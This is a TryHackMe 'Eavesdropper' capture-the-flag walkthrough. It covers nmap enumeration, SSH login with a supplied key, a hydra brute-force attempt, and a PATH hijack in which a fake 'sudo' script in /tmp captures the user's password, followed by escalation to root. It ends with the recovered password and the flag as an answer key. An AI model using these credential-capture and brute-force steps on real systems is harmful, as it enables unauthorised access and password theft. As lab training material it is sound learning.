# TryHackMe - Eavesdropper

## 📌 Task 1: Download Keys

## 🛠 Setup

Set an environment variable for the IP to simplify commands:

```bash
export IP=10.10.165.11
```

### 🔍 Nmap Scan

```bash
nmap -sC -sV -oN nmap/initial $IP
```

**Results:**
```
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)            
| ssh-hostkey:                                                                               
|   3072 d4:d1:b6:70:84:a1:90:0d:58:4d:15:68:cd:2e:e6:bb (RSA)                               
|   256 aa:da:e4:1a:01:28:d1:5d:00:6f:37:68:ec:6e:86:cb (ECDSA)                              
|_  256 42:63:90:6e:9f:1a:8b:c4:f7:bb:aa:23:a2:5f:92:8f (ED25519)                            
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel         
```
## 📌 Task 2: Find the Flag

Let's see if we can get in with using the username frank and the ssh key
```bash
ssh -i id_rsa frank@10.10.165.11  
```
### Yes, we're in. 

Let's have a look around first and then if needed we can use linpeas

```
1. cat etc/passwd : nope
2. Sudo -l : We don't know his password so we can't checck sudo -l
3. What groups is frank in?
4. SUID: That migth be worth a look
```

Hmm one thing that's interesting. Frank is in the sudo group. But we need his password!
```bash
id
```
**Results:**
```
uid=1000(frank) gid=1000(frank) groups=1000(frank),27(sudo)   
```

Let's have a look for SUID's
```bash
find / -perm -u=s -type f 2>/dev/null

/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/chfn
/usr/bin/mount
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/passwd
/usr/bin/umount
/usr/bin/sudo
```
I played around with passwd but couldn't get anywhere.

Let's see if we can brute force franks password with hydra
```bash
hydra -l frank -P /usr/share/wordlists/rockyou.txt ssh://10.10.165.11

Nope!
```
Next. I moved onto pspy32. I upload the script using python http.server and chmod to exeucte. In here I found what looks like a cron job running regularly as root.

**Results:**
```
2025/07/05 15:25:42 CMD: UID=0     PID=410546 | sudo cat /etc/shadow 
```
What's interesting is there is no path provided for sudo. We can use this and create our own sudo! All we need to do is update our own path and then create a new file. 

Update franks path to include /tmp using his login script ".bashrc"
```
PATH=/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
```
Create a file called sudo in tmp
```
#!/bin/bash
read shadow_pass
echo $shadow_pass >> /tmp/password

chmod +x sudo
```

Wait for the file to appear.
```bash
/tmp/password
```

**Results:**
```
!@#frankisawesome2022%*
```
We have his password. Let's get root!

```bash
sudo su
<!@#frankisawesome2022%*>
```
### We're root!

```bash
cat /root/flag.txt

flag{14370304172628f784d8e8962d54a600}
```

**Q. What is the flag in root's home directory?
A. flag{14370304172628f784d8e8962d54a600}
